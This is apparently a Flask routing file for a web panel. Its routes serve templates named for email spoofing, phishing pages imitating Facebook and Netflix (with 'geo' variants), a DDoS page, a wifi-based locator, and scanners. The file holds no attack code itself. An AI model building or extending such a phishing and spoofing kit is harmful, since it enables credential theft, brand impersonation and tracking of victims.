from flask import Blueprint , render_template 
from . import db
import sqlite3
main = Blueprint('main', __name__,template_folder='template')







@main.route('/')
def index():
   return render_template('index.html')
@main.route('/panel')
def profile():
   return render_template('Servicios.html')
@main.route('/panel1')
def scan():
   return render_template('scan/ver.html')
@main.route('/panel2')
def email():
   return render_template('spoofing/email.html')
@main.route('/panel3')
def emailpro():
   return render_template('spoofing/email-basic.html')
@main.route('/panel4')
def phishing():
   return render_template('phishing/phishing.html')
@main.route('/panel5')
def ddos():
   return render_template('webhive3.html')
@main.route('/panel6')
def pro():
   return render_template('/Localizador/wifi/index.html')
@main.route('/panel7')
def datos():
   return render_template('phishing/datos.html')
@main.route('/panel8')
def busca():
   return render_template('phishing/buscar.html')
@main.route('/panel9')
def facebook():
   return render_template('phishing/Facebook.html')
@main.route('/panel10')
def netflix():
   return render_template('phishing/Netflix.html')
@main.route('/panel11')
def facebookgeo():
   return render_template('phishing/Facebook1.html')
@main.route('/panel12')
def netflixgeo():
   return render_template('phishing/Netflix1.html')
@main.route('/panel13')
def buscarg():
   return render_template('/Localizador/buscarg.html')
@main.route('/panel14')
def scan1():
   return render_template('scan/check.php')

   
